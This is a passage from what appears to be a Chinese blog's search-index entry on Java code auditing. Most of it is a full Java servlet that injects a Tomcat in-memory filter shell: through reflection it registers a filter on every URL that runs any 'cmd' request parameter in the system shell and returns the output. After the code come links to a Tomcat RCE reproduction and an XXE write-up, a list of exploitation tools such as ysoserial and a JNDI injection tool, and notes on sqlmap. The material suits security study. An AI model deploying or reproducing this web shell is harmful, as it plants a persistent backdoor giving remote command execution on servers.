class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> pres.test.momenshell;<br><br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationContext;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;<br><span class="hljs-keyword">import</span> org.apache.catalina.Context;<br><br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AddTomcatFilter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-built_in">this</span>.doPost(req, resp);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;RoboTerh&quot;</span>;<br>            <span class="hljs-comment">//从request中获取ServletContext</span><br>            <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> req.getSession().getServletContext();<br><br>            <span class="hljs-comment">//从context中获取ApplicationContext对象</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            appctx.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br><br>            <span class="hljs-comment">//从ApplicationContext中获取StandardContext对象</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br><br>            <span class="hljs-comment">//从StandardContext中获得filterConfigs这个map对象</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>            Configs.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br><br>            <span class="hljs-comment">//如果这个过滤器名字没有注册过</span><br>            <span class="hljs-keyword">if</span> (filterConfigs.get(name) == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">//自定义一个Filter对象</span><br>                <span class="hljs-type">Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Filter</span>() &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>                    &#125;<br><br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>                        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;<br>                        <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> resp.getWriter();<br>                            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                            String[] commands = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">3</span>];<br>                            <span class="hljs-type">String</span> <span class="hljs-variable">charsetName</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;window&quot;</span>) ? <span class="hljs-string">&quot;GBK&quot;</span>:<span class="hljs-string">&quot;UTF-8&quot;</span>;<br>                            <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="hljs-string">&quot;WIN&quot;</span>)) &#123;<br>                                commands[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;cmd&quot;</span>;<br>                                commands[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;/c&quot;</span>;<br>                            &#125; <span class="hljs-keyword">else</span> &#123;<br>                                commands[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>                                commands[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-c&quot;</span>;<br>                            &#125;<br>                            commands[<span class="hljs-number">2</span>] = cmd;<br>                            <span class="hljs-keyword">try</span> &#123;<br>                                writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next());<br>                                writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;flush&quot;</span>).invoke(writer);<br>                                writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;close&quot;</span>).invoke(writer);<br>                                <span class="hljs-keyword">return</span>;<br>                            &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) &#123;<br>                                e.printStackTrace();<br>                            &#125;<br><br>                        &#125;<br>                        filterChain.doFilter(servletRequest, servletResponse);<br>                    &#125;<br><br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>                    &#125;<br><br>                &#125;;<br><br>                <span class="hljs-comment">//创建FilterDef对象 并添加 filter对象，filtername, filter类</span><br>                <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>                filterDef.setFilter(filter);<br>                filterDef.setFilterName(name);<br>                filterDef.setFilterClass(filter.getClass().getName());<br>                <span class="hljs-comment">//通过addFilterDef方法添加 filterDef 方法</span><br>                standardContext.addFilterDef(filterDef);<br><br>                <span class="hljs-comment">//创建FilterMap对象，并添加 filter映射，filtername</span><br>                <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>                filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>                filterMap.setFilterName(name);<br>                <span class="hljs-comment">//这个不要忘记了</span><br>                filterMap.setDispatcher(DispatcherType.REQUEST.name());<br><br>                <span class="hljs-comment">//通过addFilterMapBefore方法添加filterMap对象</span><br>                standardContext.addFilterMapBefore(filterMap);<br><br>                <span class="hljs-comment">//通过前面获取的filtermaps的put方法放入filterConfig</span><br>                <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);<br>                constructor.setAccessible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);<br><br>                filterConfigs.put(name, filterConfig);<br><br>                <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> resp.getWriter();<br>                out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br>            &#125;<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="tomcat中间件漏洞"><a href="#tomcat中间件漏洞" class="headerlink" title="tomcat中间件漏洞"></a>tomcat中间件漏洞</h3><ul><li><p>最新RCE漏洞</p><p><a href="https://www.freebuf.com/vuls/425025.html">CVE-2025-24813 RCE复现 - FreeBuf网络安全行业门户</a></p></li></ul><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p><a href="https://mp.weixin.qq.com/s/5hYQQBRhdoU5yxXMsDmClA">记一次开源cms的Java代审 (qq.com)</a></p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul><li>Beynd Compare：文件对比工具，对比两个文件找到不同版本代码的差别</li><li>jndi注入工具：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</li><li>shiro反序列化工具：<a href="https://github.com/Ares-X/shiro-exploit">https://github.com/Ares-X/shiro-exploit</a></li><li>反序列化工具：ysoserial   <a href="https://blog.csdn.net/st3pby/article/details/135111050">Java反序列化工具ysoserial使用-CSDN博客</a></li></ul><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul><li><p>使用sqlmap时经常无法测出注入点</p></li><li><p>尝试网上方法修改源代码</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/%E6%B3%A8%E5%85%A5%E7%82%B9.png"></p><p>发现此代码是控制404的响应结果的，注释掉会让sqlmap强行检测注入点</p></li><li><p>问题未解决，依旧无法测出注入点</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Java代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
      <tag>漏洞学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
